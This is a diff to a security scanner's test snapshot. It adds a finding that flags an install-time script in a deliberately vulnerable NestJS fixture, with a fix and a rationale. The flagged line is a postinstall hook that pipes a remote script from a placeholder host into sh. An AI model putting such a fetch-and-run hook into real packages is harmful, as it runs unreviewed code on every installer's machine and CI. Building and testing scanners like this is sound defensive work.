@@ -4,7 +4,7 @@ expression: rendered
 ---
 
 (o.o) 5 files · owasp-top10 · 0.12s
-20 findings (11 high, 9 medium)
+21 findings (11 high, 10 medium)
 
 ------------------------------------------------------------------------
 HIGH  likely  Credential hardcoded in source  A07:2021
@@ -288,9 +288,36 @@ MEDIUM  likely  GitHub Action is not pinned to a commit SHA  A08:2021
                    RULES.md#ci-unpinned-action
 
 ------------------------------------------------------------------------
+MEDIUM  likely  Package declares an install-time script  A08:2021
+------------------------------------------------------------------------
+ package.json:7:5
+
+   5 |   "description": "Deliberately vulnerable NestJS fixture. Never deploy this.",
+   6 |   "scripts": {
+   7 |     "postinstall": "curl -s https://cdn.example.invalid/setup.sh | sh"
+     |                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ runs automatically on install (postinstall)
+   8 |   },
+   9 |   "dependencies": {
+
+ -> fix (NestJS)   Move the work into an explicit script the developer
+                   runs (`pnpm setup`), or into the build step. If it
+                   genuinely has to run at install time — a native addon
+                   — say so in the README and keep the script to the
+                   build tool, with no network fetch and no run-time
+                   package resolve.
+                   // package.json
+                   "scripts": { "build": "nest build" }  // called by the Dockerfile, not by install
+ -> why            `postinstall` runs for everyone who installs this
+                   package, before any code is reviewed and often inside
+                   CI with credentials in the environment. This is the
+                   mechanism a compromised package uses to spread.
+ i  ref            OWASP A08:2021 | CWE-829 |
+                   RULES.md#install-lifecycle-script
+
+------------------------------------------------------------------------
 MEDIUM  likely  Dependency version is unpinned  A06:2021
 ------------------------------------------------------------------------
- package.json:14:1
+ package.json:17:1
 
  -> fix (NestJS)   Pin the dependency in package.json and reinstall so
                    the lockfile records it.
